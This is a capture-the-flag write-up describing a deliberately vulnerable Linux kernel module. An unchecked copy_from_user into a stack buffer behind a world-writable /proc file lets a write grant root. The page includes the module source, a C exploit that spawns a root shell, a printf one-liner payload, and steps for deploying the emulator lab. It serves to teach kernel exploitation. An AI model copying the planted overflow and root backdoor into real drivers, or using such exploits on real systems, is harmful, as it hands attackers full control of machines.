---
title: "Procfs Overflow Challenge"
description: "Documentation of a kernel-space stack overflow via procfs."
date: "2026-01-05"
order: 9
draft: false
---

# Procfs Overflow Challenge: Kernel Stack Corruption

This challenge introduces memory corruption in kernel space. By exploiting an unsafe data transfer from user-space to a fixed-size kernel stack buffer, we can overwrite adjacent local variables to hijack the program logic.

## The Driver Code

The module defines a `struct challenge_state` on the stack. The vulnerability lies in `device_write`, which copies user data without validating the length against the destination buffer.

```c
#include <linux/cred.h>
#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/proc_fs.h>
#include <linux/uaccess.h>

#define PROC_FILENAME "pwnmepls"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("fitrafep");
MODULE_DESCRIPTION("Buffer Overflow Challenge");

struct challenge_state {
  char buffer[64];
  long win_condition;
};

static struct proc_dir_entry *proc_entry;

static void win(void) {
  printk(KERN_INFO "overflow_chall: You win! Elevating privileges...\n");
  commit_creds(prepare_kernel_cred(NULL));
}

static ssize_t device_write(struct file *filp, const char __user *buff,
                            size_t len, loff_t *off) {
  struct challenge_state state;
  state.win_condition = 0;

  if (copy_from_user(state.buffer, buff, len))
    return -EFAULT;

  if (state.win_condition == 0x1337) {
    win();
  } else {
    printk(KERN_INFO
           "overflow_chall: win_condition is 0x%lx, expected 0x1337\n",
           state.win_condition);
  }

  return len;
}

#ifdef HAVE_PROC_OPS
static const struct proc_ops proc_fops = {
    .proc_write = device_write,
};
#else
static const struct file_operations proc_fops = {
    .write = device_write,
};
#endif

static int __init overflow_chall_init(void) {
  proc_entry = proc_create(PROC_FILENAME, 0666, NULL, &proc_fops);
  return proc_entry ? 0 : -ENOMEM;
}

static void __exit overflow_chall_exit(void) { proc_remove(proc_entry); }

module_init(overflow_chall_init);
module_exit(overflow_chall_exit);
```

## Makefile

```makefile
obj-m += overflow_chall.o

all:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

clean:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
```

## Exploit Script (C)

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>

int main() {
    // 1. Prepare the overflow payload
    char payload[64 + 8];
    memset(payload, 'A', 64);
    unsigned long win_val = 0x1337;
    memcpy(payload + 64, &win_val, 8);

    // 2. Trigger the overflow via write
    int fd = open("/proc/pwnmepls", O_WRONLY);
    if (fd < 0) { perror("open write"); return 1; }
    write(fd, payload, sizeof(payload));
    close(fd);

    // 3. Verify root escalation
    if (getuid() == 0) {
        printf("[+] Success! We are root.\n");
        system("/bin/sh");
    } else {
        printf("[-] Failed to get root.\n");
    }

    return 0;
}
```

## Exploit Script (Shell)

```bash
#!/bin/sh
echo "[*] Writing payload to /proc/pwnmepls using printf..."

printf 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x37\x13\x00\x00\x00\x00\x00\x00' > /proc/pwnmepls

if [ $(id -u) -eq 0 ]; then
    echo "[+] Success! We are root."
else
    echo "[-] Failed to get root. Check dmesg."
fi
```

## Deployment

To deploy this challenge using the [kernel-pwn-minimal](https://github.com/fepfitra/kernel-pwn-minimal) orchestrator, place the challenge source code in the `src/` directory and your exploit source in the `exploit/` directory.

Modify the `rootfs/init` script to load the module and trigger the exploit:

```diff
-exec /bin/sh
+insmod /secret_chall.ko
+su pwn -c "/exploit_secret"
+poweroff -f
```

Finally, rebuild the rootfs and launch the environment:

```bash
./pack.sh && ./run.sh
```
